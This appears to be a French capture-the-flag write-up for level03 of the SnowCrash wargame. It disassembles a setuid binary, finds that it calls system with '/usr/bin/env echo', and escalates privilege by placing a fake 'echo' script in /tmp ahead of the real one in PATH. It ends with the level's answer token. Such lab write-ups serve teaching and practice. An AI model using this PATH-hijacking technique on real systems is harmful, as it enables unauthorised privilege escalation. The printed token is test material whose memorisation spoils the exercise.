# Level 03

```bash
$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, 
version 1 (SYSV), dynamically linked (uses shared libs), 
for GNU/Linux 2.6. [.....] not stripped
```

Ok nice, on a binaire ! executons le :

```bash
$ ./level03
Exploit me
```

ok, il est assez clair qu'on a du reverse engineering a faire !

Commencons avec un simple `disas main` :

```bash
$ gdb ./level03
...
$ disas main
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
            .....
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave
   0x08048504 <+96>:    re
```

Tres interessant, on constate qu'on a un `movl` juste avant
un appel a la fonction `system` (qui execute du shell), Donc
on peut inferer qu'a l'addresse `$0x80485e0` on a une chaine
de caractere qui est executé par `system`.
Faisons une lecture de la potentielle chaine de caractere a cette
adresse là :

```bash
$ x/s 0x80485e0
0x80485e0:       "/usr/bin/env echo Exploit me"
```

On voit que la fonction system est appelée avec le 
parametre "/usr/bin/env echo Exploit me", on peut donc creer une fausse commande
`echo` qui est inscrite avant dans le PATH, et qui appele `getflag` :

```bash
$ echo "/bin/sh -c getflag" > /tmp/echo
...
$ chmod 777 /tmp/echo
-rwxrwxrwx 1 level03 level03 19 Oct 15 16:30 /tmp/echo
```

Parfait ! maintenant ajoutons tout sa dans le PATH au *bonne endroit* ! (avant le vrai echo)

```bash
$ export PATH=/tmp:$PATH
```

et finalement lançons tout sa (dans la meme session shell que le export !):

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Youhou !
